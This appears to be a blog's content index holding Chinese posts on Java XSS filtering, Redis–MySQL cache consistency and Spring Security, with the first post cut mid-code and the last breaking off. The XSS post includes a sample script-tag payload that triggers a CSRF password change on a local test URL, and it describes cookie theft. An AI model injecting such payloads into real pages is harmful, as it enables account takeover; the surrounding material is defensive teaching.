10 11 12 13 14 15 16 17 18 /** * 自定义xss校验注解 * * @author 7bin */ @Retention(RetentionPolicy.RUNTIME) @Target(value = { ElementType.METHOD, ElementType.FIELD, ElementType.CONSTRUCTOR, ElementType.PARAMETER }) @Constraint(validatedBy = { XssValidator.class }) public @interface Xss { String message() default \u0026#34;不允许任何脚本运行\u0026#34;; Class\u0026lt;?\u0026gt;[] groups() default {}; Class\u0026lt;? extends Payload\u0026gt;[] payload() default {}; } 自定义校验器XssValidator\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 /** * 自定义xss校验注解实现 * * @author 7bin */ public class XssValidator implements ConstraintValidator\u0026lt;Xss, String\u0026gt; { private static final String HTML_PATTERN = \u0026#34;\u0026lt;(\\\\S*?)[^\u0026gt;]*\u0026gt;.*?|\u0026lt;.*? /\u0026gt;\u0026#34;; @Override public boolean isValid(String value, ConstraintValidatorContext constraintValidatorContext) { if (StringUtils.isBlank(value)) { return true; } return !containsHtml(value); } public static boolean containsHtml(String value) { Pattern pattern = Pattern.compile(HTML_PATTERN); Matcher matcher = pattern.matcher(value); return matcher.matches(); } } 使用自定义Xss注解\n实体类\n1 2 3 4 5 6 7 8 9 10 public class SysUser extends BaseEntity { .... @Xss(message = \u0026#34;用户账号不能包含脚本字符\u0026#34;) @NotBlank(message = \u0026#34;用户账号不能为空\u0026#34;) @Size(min = 0, max = 30, message = \u0026#34;用户账号长度不能超过30个字符\u0026#34;) public String getUserName() { return userName; } } Controller\n在Controller的方法上，给参数SysUser类加上@Validated来修饰，这样校验就可以生效了\n1 2 3 4 5 @PutMapping public ApiResponse edit(@Validated @RequestBody SysUser user) { ... } escapeHTML 在服务端添加XSS的Filter，用于正确处理转义字符，产生正确的Java、JavaScript、HTML、XML和SQL代码\nFilterConfig：注册XSS过滤器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 @Configuration public class FilterConfig { @Value(\u0026#34;${xss.excludes}\u0026#34;) private String excludes; @Value(\u0026#34;${xss.urlPatterns}\u0026#34;) private String urlPatterns; @SuppressWarnings({ \u0026#34;rawtypes\u0026#34;, \u0026#34;unchecked\u0026#34; }) @Bean @ConditionalOnProperty(value = \u0026#34;xss.enabled\u0026#34;, havingValue = \u0026#34;true\u0026#34;) public FilterRegistrationBean xssFilterRegistration() { FilterRegistrationBean registration = new FilterRegistrationBean(); registration.setDispatcherTypes(DispatcherType.REQUEST); registration.setFilter(new XssFilter()); registration.addUrlPatterns(StringUtils.split(urlPatterns, \u0026#34;,\u0026#34;)); registration.setName(\u0026#34;xssFilter\u0026#34;); registration.setOrder(FilterRegistrationBean.HIGHEST_PRECEDENCE); Map\u0026lt;String, String\u0026gt; initParameters = new HashMap\u0026lt;String, String\u0026gt;(); initParameters.put(\u0026#34;excludes\u0026#34;, excludes); registration.setInitParameters(initParameters); return registration; } } XssFilter：使用自定义XssHttpServletRequestWrapper替换默认的request\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 /** * 防止XSS攻击的过滤器 * * @author 7bin */ public class XssFilter implements Filter { /** * 排除链接 */ public List\u0026lt;String\u0026gt; excludes = new ArrayList\u0026lt;\u0026gt;(); @Override public void init(FilterConfig filterConfig) throws ServletException { String tempExcludes = filterConfig.getInitParameter(\u0026#34;excludes\u0026#34;); if (StringUtils.isNotEmpty(tempExcludes)) { String[] url = tempExcludes.split(\u0026#34;,\u0026#34;); for (int i = 0; url != null \u0026amp;\u0026amp; i \u0026lt; url.length; i++) { excludes.add(url[i]); } } } @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { HttpServletRequest req = (HttpServletRequest) request; HttpServletResponse resp = (HttpServletResponse) response; if (handleExcludeURL(req, resp)) { chain.doFilter(request, response); return; } XssHttpServletRequestWrapper xssRequest = new XssHttpServletRequestWrapper((HttpServletRequest) request); chain.doFilter(xssRequest, response); } private boolean handleExcludeURL(HttpServletRequest request, HttpServletResponse response) { String url = request.getServletPath(); String method = request.getMethod(); // GET DELETE 不过滤 if (method == null || HttpMethod.GET.matches(method) || HttpMethod.DELETE.matches(method)) { return true; } return StringUtils.matches(url, excludes); } @Override public void destroy() { } } XssHttpServletRequestWrapper\nxss过滤（清除所有HTML标签，但是不删除标签内的内容）：json = EscapeUtil.clean(json).trim();\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 /** * XSS过滤处理 * * @author 7bin */ public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper { /** * @param request */ public XssHttpServletRequestWrapper(HttpServletRequest request) { super(request); } @Override public String[] getParameterValues(String name) { String[] values = super.getParameterValues(name); if (values != null) { int length = values.length; String[] escapesValues = new String[length]; for (int i = 0; i \u0026lt; length; i++) { // 防xss攻击和过滤前后空格 escapesValues[i] = EscapeUtil.clean(values[i]).trim(); } return escapesValues; } return super.getParameterValues(name); } @Override public ServletInputStream getInputStream() throws IOException { // 非json类型，直接返回 if (!isJsonRequest()) { return super.getInputStream(); } // 为空，直接返回 String json = IOUtils.toString(super.getInputStream(), \u0026#34;utf-8\u0026#34;); if (StringUtils.isEmpty(json)) { return super.getInputStream(); } // xss过滤 json = EscapeUtil.clean(json).trim(); byte[] jsonBytes = json.getBytes(\u0026#34;utf-8\u0026#34;); final ByteArrayInputStream bis = new ByteArrayInputStream(jsonBytes); return new ServletInputStream() { @Override public boolean isFinished() { return true; } @Override public boolean isReady() { return true; } @Override public int available() throws IOException { return jsonBytes.length; } @Override public void setReadListener(ReadListener readListener) { } @Override public int read() throws IOException { return bis.read(); } }; } /** * 是否是Json请求 * */ public boolean isJsonRequest() { String header = super.getHeader(HttpHeaders.CONTENT_TYPE); return StringUtils.startsWithIgnoreCase(header, MediaType.APPLICATION_JSON_VALUE); } } http-only 如果某一个Cookie 选项被设置成 HttpOnly = true 的话，那此Cookie 只能通过服务器端修改，JS 是操作不了的，对于 document.cookie 来说是透明的。\nhttp-only 的应用场景是防止 XSS 攻击。\n举例：\n例如我在评论区写了一段 hack JS，服务端因存在 XSS 漏洞，没有对 \u0026lt; 进行转义。导致这段 JS 在其他人打开此页面的时候也被执行了。\n如果我上面的 hack JS 中写了获取所有 cookie，并发送到我的服务器上，这样用户的登录信息就泄漏了。\n如果 cookie 开启了 http-only 之后，我的hack js 无法获取到用户的 cookie，它们的登录信息就无法泄漏了。\n以 Google 翻译为例子，初次打开时，Cookie里面是这样的一共有4条记录，注意第二个最右侧倒数第三个字段有一个√， 这个对勾表明这条记录是 HttpOnly = true 的，对于Js，你是拿不到的。\n服务端设置Cookie\n1 2 3 4 5 6 7 8 9 10 @RequestMapping(\u0026#34;/login\u0026#34;) @ResponseBody public void login(HttpServletRequest request, HttpServletResponse response) throws IOException { Cookie cookie = new Cookie(\u0026#34;access_token\u0026#34;, UUID.randomUUID().toString()); cookie.setHttpOnly(true); // 这里 cookie.setPath(\u0026#34;/\u0026#34;); cookie.setDomain(\u0026#34;localhost\u0026#34;); response.addCookie(cookie); response.sendRedirect(\u0026#34;http://localhost:8088/index.html\u0026#34;); } xss攻击和csrf攻击配合 一般攻击可能不是单一的行为，而是可能会组合攻击；比如xss攻击一般还可以配合csrf攻击进行配合攻击，这里给个例子，方便你理解；注意，只是仅仅方便你理解，实际不是这么简单。\n假设你可以通过如下GET请求方式进行修改密码，这是典型的csrf攻击方式：开发安全 - CSRF 详解\n1 2 http://127.0.0.1/test/vulnerabilities/csrf/? password_new=123456\u0026amp;password_conf=123456\u0026amp;Change=Change 那么你可以通过如下方式xss攻击添加脚本\n1 2 \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;http://127.0.0.1/test/vulnerabilities/csrf/? password_new=123456\u0026amp;password_conf=123456\u0026amp;Change=Change#\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 参考链接\n开发安全 - XSS 详解\n","permalink":"https://chance7bin.github.io/posts/design/xss/","summary":"XSS是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为X","title":"xss"},{"content":"背景 如果你的业务处于起步阶段，流量非常小，那无论是读请求还是写请求，直接操作数据库即可，这时你的架构模型是这样的：\n但随着业务量的增长，你的项目请求量越来越大，这时如果每次都从数据库中读数据，那肯定会有性能问题。\n这个阶段通常的做法是，引入「缓存」来提高读性能，架构模型就变成了这样：\n当下优秀的缓存中间件，当属 Redis 莫属，它不仅性能非常高，还提供了很多友好的数据类型，可以很好地满足我们的业务需求。\n但引入缓存之后，你就会面临一个问题：之前数据只存在数据库中，现在要放到缓存中读取，具体要怎么存呢？\nCache Aside Pattern（旁路缓存模式） Cache Aside Pattern 中遇到写请求是这样的：更新 DB，然后直接删除 cache 。\n缓存一致性问题 并发引发的一致性问题 2 个线程并发「读写」数据：\n缓存中 X 不存在（数据库 X = 1） 线程 A 读取数据库，得到旧值（X = 1） 线程 B 更新数据库（X = 2) 线程 B 删除缓存 线程 A 将旧值写入缓存（X = 1） 最终 X 的值在缓存中是 1（旧值），在数据库中是 2（新值），发生不一致。\n这种情况「理论」来说是可能发生的，其实概率「很低」，这是因为它必须满足 3 个条件：\n缓存刚好已失效 读请求 + 写请求并发 更新数据库 + 删除缓存的时间（步骤 3-4），要比读数据库 + 写缓存时间短（步骤 2 和 5） 为了避免这种情况的发生，采取写数据库时「加锁」的方式，防止其它线程对缓存读取和更改\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 ReentrantReadWriteLock lock = new ReentrantReadWriteLock(); public int update(String sql, Object... params) { SqlPair key = new SqlPair(sql, params); // 加写锁, 防止其它线程对缓存读取和更改 lock.writeLock().lock(); try { int rows = genericDao.update(sql, params); map.clear(); return rows; } finally { lock.writeLock().unlock(); } } public T queryOne(Class\u0026lt;T\u0026gt; beanClass, String sql, Object... params) { SqlPair key = new SqlPair(sql, params); // 加读锁, 防止其它线程对缓存更改 lock.readLock().lock(); try { T value = map.get(key); if (value != null) { return value; } } finally { lock.readLock().unlock(); } // 加写锁, 防止其它线程对缓存读取和更改 lock.writeLock().lock(); try { // get 方法上面部分是可能多个线程进来的, 可能已经向缓存填充了数据 // 为防止重复查询数据库, 再次验证 T value = map.get(key); if (value == null) { // 如果没有, 查询数据库 value = genericDao.queryOne(beanClass, sql, params); map.put(key, value); } return value; } finally { lock.writeLock().unlock(); } } 通过上述加锁的逻辑，采取「先更新数据库 + 再删除缓存」的方案，是可以保证数据一致性的\n删除缓存失败引发的一致性问题 「先更新数据库 + 再删除缓存」中第二步执行「失败」导致数据不一致的问题\n如何保证两步都执行成功？\n答案是：重试。\n最佳实线是采取异步重试的方案\n把重试请求写到「消息队列」中，然后由专门的消费者来重试，直到成功。\n或者更直接的做法，为了避免第二步执行失败，我们可以把操作缓存这一步，直接放到消息队列中，由消费者来操作缓存。\n删除缓存操作投递到消息队列中 所以，引入消息队列来解决这个问题，是比较合适的。这时架构模型就变成了这样：\n代码实现\n采取的是RabbitMQ作为消息队列\n更新业务\n清除缓存操作交给rabbitmq listener处理\n1 2 3 4 5 6 7 8 9 10 11 12 13 public int update(String sql, Object... params) { SqlPair key = new SqlPair(sql, params); // 加写锁, 防止其它线程对缓存读取和更改 lock.writeLock().lock(); try { int rows = genericDao.update(sql, params); // map.clear(); MqUtils.sendRedisKeyToMq(key); // 清除缓存操作交给rabbitmq listener处理 return rows; } finally { lock.writeLock().unlock(); } } MqUtils\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class MqUtils { /** * redis键 * @param redisKey redis键 * @author 7bin **/ public static void sendRedisKeyToMq(String redisKey){ // 1.准备消息 Message message = MessageBuilder .withBody(redisKey.getBytes(StandardCharsets.UTF_8)) .setDeliveryMode(MessageDeliveryMode.NON_PERSISTENT) .build(); // 2.发送消息 RabbitTemplate rabbitTemplate = SpringUtils.getBean(\u0026#34;rabbitTemplate\u0026#34;); rabbitTemplate.convertAndSend(\u0026#34;redis.queue\u0026#34;, message); } } RabbitMqListener\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 @Slf4j @Component public class RabbitMqListener { @Autowired private RedisCache redisCache; @RabbitListener(queues = \u0026#34;redis.queue\u0026#34;) public void listenRedisQueue(String msg) { log.info(\u0026#34;清除缓存: [ key: {} ]\u0026#34;, msg); redisCache.del(msg); } } yml配置\n开启重试机制\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 spring: rabbitmq: host: 172.21.212.177 # rabbitMQ的ip地址 port: 5672 # 端口 username: binbin password: binbin virtual-host: / # 虚拟主机 listener: simple: prefetch: 1 # 每次从MQ中取出一条消息进行消费 acknowledge-mode: auto # 自动确认 retry: enabled: true # 开启重试机制 initial-interval: 1000 # 重试间隔时间 multiplier: 3 # 重试倍数 max-attempts: 4 # 最大重试次数 数据库更新日志投递到消息队列中 那如果你确实不想在应用中去写消息队列，是否有更简单的方案，同时又可以保证一致性呢？\n方案还是有的，这就是近几年比较流行的解决方案：订阅数据库变更日志，再操作缓存。\n具体来讲就是，我们的业务应用在修改数据时，==「只需」修改数据库，无需操作缓存==。\n那什么时候操作缓存呢？这就和数据库的「变更日志」有关了。\n拿 MySQL 举例，当一条数据发生修改时，MySQL 就会产生一条变更日志（Binlog），我们可以订阅这个日志，拿到具体操作的数据，然后再根据这条数据，去删除对应的缓存。\n订阅变更日志，目前也有了比较成熟的开源中间件，例如阿里的 canal，使用这种方案的优点在于：\n无需考虑写消息队列失败情况：只要写 MySQL 成功，Binlog 肯定会有 自动投递到下游队列：canal 自动把数据库变更日志「投递」给下游的消息队列 canal代码示例\n代码实现\nrabbitmq+canal\n首先配置Mysql整合rabbit\n参考链接：https://blog.csdn.net/qq_37487520/article/details/126078570\nmq队列监听代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 @Slf4j @Component public class RabbitMqListener { @Autowired private RedisCache redisCache; @RabbitListener(bindings = @QueueBinding( value = @Queue(name = \u0026#34;canal.queue\u0026#34;), exchange = @Exchange(name = \u0026#34;canal.fanout\u0026#34;, type = ExchangeTypes.FANOUT), key = {\u0026#34;canal\u0026#34;} )) public void listenCanalQueue(Message mqMessage, Channel channel) { String message = new String(mqMessage.getBody(), StandardCharsets.UTF_8); // 解析message转换成CanalMessage对象 CanalMessage canalMessage = JSONUtil.toBean(message, CanalMessage.class); String type = canalMessage.getType(); if (type == null) { log.info (\u0026#34;unknown type {}\u0026#34;, canalMessage.getType()); return; } if (type.equals(\u0026#34;INSERT\u0026#34;) || type.equals(\u0026#34;UPDATE\u0026#34;) || type.equals(\u0026#34;DELETE\u0026#34;)) { handleRedisCache(canalMessage.getTable(), canalMessage.getData()); } else { log.info(\u0026#34;ignore type {}\u0026#34;, canalMessage.getType()); } } private void handleRedisCache(String tableName, Object data) { // 根据表名和字段名获取缓存key String key = getKey(tableName, data); redisCache.del(key); log.info(\u0026#34;清除缓存: [ key: {} ]\u0026#34;, key); } String getKey(String tableName, Object data) { // 构建redis key的逻辑 } } 下面是不走消息队列，直接通过cannal监听MySQL的变化\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 @Slf4j @Component public class MysqlDataListening { private static final ThreadFactory springThreadFactory = new CustomizableThreadFactory(\u0026#34;canal-pool-\u0026#34;); private static final ExecutorService executors = Executors.newFixedThreadPool(1, springThreadFactory); @Autowired RedisCache redisCache; @PostConstruct private void startListening() { executors.submit(() -\u0026gt; { connector(); }); } void connector(){ log.info(\u0026#34;start listening mysql data change...\u0026#34;); // 创建链接 CanalConnector connector = CanalConnectors.newSingleConnector(new InetSocketAddress(AddressUtils.getHostIp(), 11111), \u0026#34;example\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;); int batchSize = 1000; int emptyCount = 0; try { connector.connect(); connector.subscribe(\u0026#34;.*\\\\..*\u0026#34;); connector.rollback(); int totalEmptyCount = 120; // while (emptyCount \u0026lt; totalEmptyCount) { while (true) { Message message = connector.getWithoutAck(batchSize); // 获取指定数量的数据 long batchId = message.getId(); int size = message.getEntries().size(); if (batchId == -1 || size == 0) { // emptyCount++; // System.out.println(\u0026#34;empty count : \u0026#34; + emptyCount); try { Thread.sleep(1000); } catch (InterruptedException e) { } } else { // emptyCount = 0; // System.out.printf(\u0026#34;message[batchId=%s,size=%s] \\n\u0026#34;, batchId, size); printEntry(message.getEntries()); } connector.ack(batchId); // 提交确认 // connector.rollback(batchId); // 处理失败, 回滚数据 } // System.out.println(\u0026#34;empty too many times, exit\u0026#34;); } finally { connector.disconnect(); } } private void printEntry(List\u0026lt;Entry\u0026gt; entrys) { for (Entry entry : entrys) { if (entry.getEntryType() == EntryType.TRANSACTIONBEGIN || entry.getEntryType() == EntryType.TRANSACTIONEND) { continue; } RowChange rowChage = null; try { rowChage = RowChange.parseFrom(entry.getStoreValue()); } catch (Exception e) { throw new RuntimeException(\u0026#34;ERROR ## parser of eromanga-event has an error , data:\u0026#34; + entry.toString(), e); } EventType eventType = rowChage.getEventType(); for (RowData rowData : rowChage.getRowDatasList()) { if (eventType == EventType.DELETE || eventType == EventType.UPDATE || eventType == EventType.INSERT) { // 增删改操作删除redis缓存 // printColumn(rowData.getAfterColumnsList()); handleRedisCache(entry.getHeader().getTableName(), rowData.getAfterColumnsList()); } else { // 其他操作 // System.out.println(\u0026#34;-------\u0026amp;gt; before\u0026#34;); // printColumn(rowData.getBeforeColumnsList()); // System.out.println(\u0026#34;-------\u0026amp;gt; after\u0026#34;); // printColumn(rowData.getAfterColumnsList()); } } } } private void printColumn(List\u0026lt;Column\u0026gt; columns) { for (Column column : columns) { log.info(column.getName() + \u0026#34; : \u0026#34; + column.getValue() + \u0026#34; update=\u0026#34; + column.getUpdated()); } } private void handleRedisCache(String tableName, List\u0026lt;CanalEntry.Column\u0026gt; columns) { // 根据表名和字段名获取缓存key String key = getKey(tableName, columns); redisCache.del(key); } } 实现参考\nmysql与缓存数据不一致解决-canal+mq方案\n通过上述的解决方案基本可以实现缓存与数据库的一致性\n参考链接\n缓存和数据库一致性问题，看这篇就够了\n","permalink":"https://chance7bin.github.io/posts/design/redis%E5%92%8Cmysql%E7%BC%93%E5%AD%98%E4%B8%80%E8%87%B4%E6%80%A7%E5%AE%9E%E7%8E%B0/","summary":"背景 如果你的业务处于起步阶段，流量非常小，那无论是读请求还是写请求，直接操作数据库即可，这时你的架构模型是这样的： 但随着业务量的增长，你的项","title":"redis和mysql缓存一致性实现"},{"content":" 参考链接：\nhttps://blog.csdn.net/liuminglei1987/category_10122574.html\n从零搭建若依(Ruoyi-Vue)管理系统(10)\u0026ndash;Spring Security核心内容梳理\nSpringSecurity-从入门到精通\n认识SpringSecurity Spring Security 是针对Spring项目的安全框架，也是Spring Boot底层安全模块默认的技术选型，他可以实现强大的Web安全控制，对于安全控制，我们仅需要引入 spring-boot-starter-security 模块，进行少量的配置，即可实现强大的安全管理！\n记住几个类：\nWebSecurityConfigurerAdapter：自定义Security策略 AuthenticationManagerBuilder：自定义认证策略 @EnableWebSecurity：开启WebSecurity模式 Spring Security的两个主要目标是 “认证” 和 “授权”（访问控制）。\n“认证”（Authentication）\n身份验证是关于验证您的凭据，如用户名/用户ID和密码，以验证您的身份。\n身份验证通常通过用户名和密码完成，有时与身份验证因素结合使用。\n“授权” （Authorization）\n授权发生在系统成功验证您的身份后，最终会授予您访问资源（如信息，文件，数据库，资金，位置，几乎任何内容）的完全权限。\n这个概念是通用的，而不是只在Spring Security 中存在。\nSpring Secutity核心内容 Spring Secutity中的用户信息 1.UserDetailsService：\n该方法很容易理解： 通过用户名来加载用户 。这个方法主要用于从系统数据中查询并加载具体的用户到 Spring Security中。\n在开发中我们一般定义一个这个接口的实现类，自定义loadUserByUsername方法，实现从数据源获取用户，加载用户信息。也可以在其中实现一些校验用户逻辑。\n1 2 3 4 5 6 @Service public class UserDetailsServiceImpl implements UserDetailsService { @Override public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException { 2.UserDetails:\n从上面 UserDetailsService 可以知道最终交给Spring Security的是UserDetails 。该接口是提供用户信息的核心接口。该接口实现仅仅存储用户的信息。后续会将该接口提供的用户信息封装到认证对象Authentication 中去。\nUserDetails中默认提供：\n用户的权限集， 默认需要添加 ROLE_ 前缀 用户的加密后的密码， 不加密会使用 {noop} 前缀 应用内唯一的用户名 账户是否过期 账户是否锁定 凭证是否过期 用户是否可用 在我们自己的项目中，我们要定义个用户类实现该接口，在该用户类中我们可以扩展更多的用户信息，比如手机、邮箱等等\n3.UserDetailsServiceAutoConfiguration\n关于加密 任何应用考虑到安全，绝不能明文的方式保存密码到数据库。密码应该通过哈希算法进行加密。\n有很多标准的算法比如SHA或者MD5，结合salt(盐)是一个不错的选择。\nSpring Security提供BCryptPasswordEncoder类,实现Spring的PasswordEncoder接口使用BCrypt强哈希方法来加密密码。BCrypt强哈希方法 每次加密的结果都不一样既然每次加密结果不一样，就不可以通过相同字符串加密后的结果来判定是不是同一个字符串了，这就更加增强了安全性。\n如果需要判断是否是原来的密码，需要用它自带的方法。\n加密：\n1 2 BCryptPasswordEncoder encode = new BCryptPasswordEncoder(); encode.encode(password); 判断：\n需要通过自带的方法 matches 将未经过加密的密码和已经过加密的密码传进去进行判断，返回布尔值。\n1 encode.matches(oldpassword,user1.getPassword()); Spring Security的配置 自定义SecurityConfig\n首先要继承WebSecurityConfigurerAdapter，其次最常用的是实现configure(AuthenticationManagerBuilder auth)、configure(WebSecurity web)、configure(HttpSecurity http)三个方法实现我们对Spring Security的自定义安全配置。\nvoid configure(AuthenticationManagerBuilder auth) 用来配置认证管理器 AuthenticationManager。 void configure(WebSecurity web)用来配置 WebSecurity 。而 WebSecurity是基于Servlet Filter用来配置 springSecurityFilterChain。而 springSecurityFilterChain 又被委托给了 Spring Security 核心过滤器 Bean DelegatingFilterProxy 。 相关逻辑你可以在 WebSecurityConfiguration 中找到。我们一般不会过多来自定义 WebSecurity , 使用较多的使其 ignoring() 方法用来忽略 Spring Security 对静态资源的控制。 void configure(HttpSecurity http) 这个是我们使用最多的，用来配置 HttpSecurity 。 HttpSecurity用于构建一个安全过滤器链 SecurityFilterChain。 SecurityFilterChain 最终被注入核心过滤器 。HttpSecurity有许多我们需要的配置。我们可以通过它来进行自定义安全访问策略。 认证流程图 登陆校验流程 SpringSecurity完整流程 SpringSecurity的原理其实就是一个过滤器链，内部包含了提供各种功能的过滤器。这里我们可以看看入门案例中的过滤器。\n图中只展示了核心过滤器，其它的非核心过滤器并没有在图中展示。\nUsernamePasswordAuthenticationFilter：负责处理我们在登陆页面填写了用户名密码后的登陆请求。入门案例的认证工作主要有它负责。\nExceptionTranslationFilter： 处理过滤器链中抛出的任何AccessDeniedException和AuthenticationException 。\nFilterSecurityInterceptor： 负责权限校验的过滤器。\n认证流程详解 概念速查:\nAuthentication接口: 它的实现类，表示当前访问系统的用户，封装了用户相关信息。\nAuthenticationManager接口：定义了认证Authentication的方法\nUserDetailsService接口：加载用户特定数据的核心接口。里面定义了一个根据用户名查询用户信息的方法。\nUserDetails接口：提供核心用户信息。通过UserDetailsService根据用户名获取处理的用户信息要封装成UserDetails对象返回。然后将这些信息封装到Authentication对象中。\n认证过程 认证过滤器UsernamePasswordAuthenticationFilter:它的作用是拦截登录请求并获取账号和 密码，然后把账号密码封装到认证凭据 UsernamePasswordAuthenticationToken 中，然后把凭据交 给特定配置的 AuthenticationManager去作认证。\n授权 权限控制配置 一、基于配置表达式控制 URL 路径\n在继承WebSecurityConfigurerAdapter的配置类中的configure(HttpSecurity http)中进行配置。\n例如：\n1 2 3 4 5 6 7 8 protected void configure(HttpSecurity http) throws Exception { http.authorizeRequests() .antMatchers(\u0026#34;/admin/**\u0026#34;).hasRole(\u0026#34;admin\u0026#34;) .antMatchers(\u0026#34;/user/**\u0026#34;).hasAnyRole(\u0026#34;admin\u0026#34;, \u0026#34;user\u0026#34;) .anyRequest().authenticated() .and() ... } 常用的配置可选项：\n二、基于注解的接口权限控制\n我们可以在任何 @Configuration实例上使用 @EnableGlobalMethodSecurity注解来启用全局方 法安全注解功能\n例如：\n1 2 3 4 5 6 @Configuration @EnableGlobalMethodSecurity(prePostEnabled = true,securedEnabled = true,jsr250Enabled = true) public class SecurityConfig extends WebSecurityConfigurerAdapter { ... ... } 设置 prePostEnabled为 true ，则开启了基于表达式 的方法安全控制。 这个配置开启了四个注解，分别是：\n@PreAuthorize：在标记的方法调用之前，通过表达式来计算是否可以授权访问。 @PostAuthorize：在标记的方法调用之后，通过表达式来计算是否可以授权访问。该注解是针对@PreAuthorize 。区别 在于先执行方法。而后进行表达式判断。如果方法没有返回值实际上等于开放权限控制；如果有返回值 实际的结果是用户操作成功但是得不到响应。 @PreFilter:基于方法入参相关的表达式，对入参进行过滤。 @PostFilter:和 @PreFilter不同的是， 基于返回值相关的表达式，对返回值进行过滤。分页慎用！ 该过程发生接口进行数据返回之前。 设置securedEnabled 为 true ，就开启了角色注解@Secured ，该注解功能要简单的多，默认情况下只能基于角色（默认需要带前缀 ROLE_ ）集合来进行访问控制决策。\n该注解的机制是只要其声明的角色集合(value )中包含当前用户持有的任一角色就可以访问。也就是 用户的角色集合和@Secured注解的角色集合要存在非空的交集。 不支持使用 SpEL表达式进行决策。\n设置 jsr250Enabled为 true ，就开启了 JavaEE 安全 注解中的以下三个：\n@DenyAll 拒绝所有的访问 @PermitAll 同意所有的访问 @RolesAllowed 用法和@Secured 一样。 ==基于注解的权限控制两种实现方式：==\n**第一种：**使用spring security自带的注解\n@PreAuthorize(\u0026quot;hasAnyAuthority('admin','test','system:dept:list')\u0026quot;)\nhasRole要求有对应的角色才可以访问，但是它内部会把我们传入的参数拼接上 ROLE_ 后再去比较。所以这种情况下要用用户对应的权限也要有 ROLE_ 这个前缀才可以。\n第二种：自定义权限校验方法\n在@PreAuthorize注解中使用我们的方法\n1 2 3 4 5 6 7 @PreAuthorize(\u0026#34;@ss.hasPermi(\u0026#39;system:menu:list\u0026#39;)\u0026#34;) @GetMapping(\u0026#34;/list\u0026#34;) public AjaxResult list(SysMenu menu) { List\u0026lt;SysMenu\u0026gt; menus = menuService.selectMenuList(menu, getUserId()); return AjaxResult.success(menus); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 /** * 验证用户是否具备某权限 * * @param permission 权限字符串 * @return 用户是否具备某权限 */ public boolean hasPermi(String permission) { if (StringUtils.isEmpty(permission)) { return false; } LoginUser loginUser = SecurityUtils.getLoginUser(); if (StringUtils.isNull(loginUser) || CollectionUtils.isEmpty(loginUser.getPermissions())) { return false; } return hasPermissions(loginUser.getPermissions(), permission); } 授权基本流程 在SpringSecurity中，会使用默认的FilterSecurityInterceptor来进行权限校验。在FilterSecurityInterceptor中会从SecurityContextHolder获取其中的Authentication，然后获取其中的权限信息。当前用户是否拥有访问当前资源所需的权限。\n所以我们在项目中只需要把当前登录用户的权限信息也存入Authentication。\n然后设置我们的资源所需要的权限即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 /** * 验证用户是否具备某权限 * * @param permission 权限字符串 * @return 用户是否具备某权限 */ public boolean hasPermi(String permission) { if (StringUtils.isEmpty(permission)) { return false; } LoginUser loginUser = SecurityUtils.getLoginUser(); if (StringUtils.isNull(loginUser) || CollectionUtils.isEmpty(loginUser.getPermissions())) { return false; } return hasPermissions(loginUser.getPermissions(), permission); } /** * 获取用户 **/ public static LoginUser getLoginUser() { try { return (LoginUser) getAuthentication().getPrincipal(); } catch (Exception e) { throw new ServiceException(\u0026#34;获取用户信息异常\u0026#34;, HttpStatus.UNAUTHORIZED); } } RBAC权限模型 RBAC权限模型（Role-Based Access Control）即：基于角色的权限控制。这是目前最常被开发者使用也是相对易用、通用权限模型。\n参考链接：\nSpring Security 中的 hasRole 和 hasAuthority 有区别吗？\n登录实现 1.引入 Spring Security 模块 1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-security\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 引入依赖后我们在尝试去访问之前的接口就会自动跳转到一个SpringSecurity的默认登陆页面，默认用户名是user,密码会输出在控制台。 必须登陆之后才能对接口进行访问。\n2.编写 Spring Security 配置类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 